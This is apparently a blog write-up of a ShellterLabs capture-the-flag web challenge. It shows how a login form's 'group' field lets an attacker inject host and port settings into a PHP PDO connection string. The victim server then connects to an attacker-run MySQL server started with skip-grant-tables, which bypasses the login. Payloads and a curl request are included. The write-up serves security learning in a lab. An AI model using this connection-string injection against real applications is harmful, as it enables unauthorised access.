---
title: "SHX13 : web300-restricted_area"
date: "2017-07-04T14:53:44.000Z"
lastmod: "2017-08-13T01:57:04.000Z"
tags: ["ctf", "web security", "shx13"]
slug: "shx13-web300-restricted_area"
url: "/shx13-web300-restricted_area/"
---
Give me the flag.

To start your challenge environment: <https://shellterlabs.com/en/ctf-master/shellter-hacking-express-master/shx-13/shx13-restricted-area/>

## Solution

![](/content/images/2017/07/Selection_999-777-.png)

A simple login form was presented to us..

I started the recon checking the HTTP methods, directory/file bruteforce, SQLi tests, found nothing suspect.

But when fuzzing the postdata `uname=test&pword=test123&group=users` the server crashed and i need to restart the environment..

Noticed this happens only when the `group` field data is changed. Changing it to everything different from `users` returned a PDO error `PDOException :: 1049`

```bash
curl -i -s -k  -X 'POST' \  
    -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' -H 'Referer: http://lab.shellterlabs.com:32849/' -H 'DNT: 1' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' \
    -b 'PHPSESSID=i1vki30916t1r7bjaprovmsi31' \
    --data-binary $'uname=test&pword=test123&group=usersAAA' \
    'http://lab.shellterlabs.com:32849/login.php'
```

![](/content/images/2017/07/Selection_999-795-.png)

`1049` error code means `unknown database`

Nice, we can control the choosen database, you can confirm this trying to select some built-in MySQL database like `sys`

![](/content/images/2017/07/Selection_999-796-.png)

As you can see, no PDO error!

Well, searching for php PDO documentation I found this reference..

```php
<?php  
/* Connect to a MySQL database using driver invocation */
$dsn = 'mysql:dbname=testdb;host=127.0.0.1';
$user = 'dbuser';
$password = 'dbpass';

try {  
    $dbh = new PDO($dsn, $user, $password);
} catch (PDOException $e) {
    echo 'Connection failed: ' . $e->getMessage();
}

?>
```

A PDO connection sample.. maybe we can have full control of `$dsn`. Let's give a try..

```
Payload: uname=test&pword=test123&group=users;host=127.0.0.1  
Answer: PDOException :: 1130
```

Hmm, error code changed to `1130`, it means `not allowed to connect to this MySQL server`. Awesome! we can point it to connect at any IP!

Obviously i launched a locally `netcat listening at port 3000`, and tried to get a reverse connection w/ this payload `uname=test&pword=test123&group=sad;host=MY_IP;port=3000`

![](/content/images/2017/07/Selection_999-794-.png)

Bam! the Shellter server is trying to connect here and when I close netcat connection it return another error code `PDOException :: 2013` which means `Lost connection to MySQL server`

Then I setup a `MySQL server` locally and launched `wireshark` to see what's happening in raw background..

![](/content/images/2017/07/Selection_999-784-.png)

The server is trying to authenticate here with `pdo_user`, and some password we don't know..

![](/content/images/2017/07/Selection_999-801-.png)

.. the password is hashed to `XXXXXXXXXXX2f337c1f8f458c8c8929e370dc494`, tried to crack w/ some common passwords and masks but no success.

I've created the `pdo_user`, but how to solve the password problem? The server needs to authenticate here before start sending queries, it's explicit `(using pass word: YES)`

> Time ago while working w/ MySQL, I remember a situation where I lost the root password, then I've used a command line argument to launch `mysqld` disabling `grants`, then was possible to access all my database sending null/invalid passwords.

`mysqld --skip-grant-tables`

..now the server authenticated and start doing some queries..

![](/content/images/2017/07/Selection_999-786-.png)

Perfect.. all we need to do now is create a database users with username/password structure and insert our valid user..

```mysql
INSERT INTO `users` (`username`, `password`) VALUES ('test', 'test123');
```

No more error, and now we got a `302` redirection to a page different from `index.php`

![](/content/images/2017/07/Selection_999-800-.png)

We are logged into the system, and here is our flag!

![](/content/images/2017/07/Selection_999-793-.png)

As always.. awesome challenge [ShellterLabs](http://shellterlabs.com)

## References

- PDO Connections and Connection management -
  <http://php.net/manual/en/pdo.connections.php>
- PDO::errorCode - <http://php.net/manual/en/pdo.errorcode.php>
